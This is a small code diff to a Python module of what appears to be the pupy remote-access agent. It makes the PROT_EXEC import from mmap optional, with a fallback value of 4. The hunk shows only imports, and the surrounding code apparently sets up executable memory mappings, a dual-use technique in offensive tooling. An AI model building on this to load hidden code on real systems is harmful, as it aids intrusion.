@@ -12,7 +12,12 @@ __all__ = (
 
 from os import unlink, fdopen
 from tempfile import mkstemp
-from mmap import mmap, PROT_WRITE, PROT_EXEC
+from mmap import mmap, PROT_WRITE
+try:
+    from mmap import PROT_EXEC
+except:
+    #mmap from rustc is missing PROT_EXEC ??
+    PROT_EXEC=4
 
 import pupy.agent as pupy
 
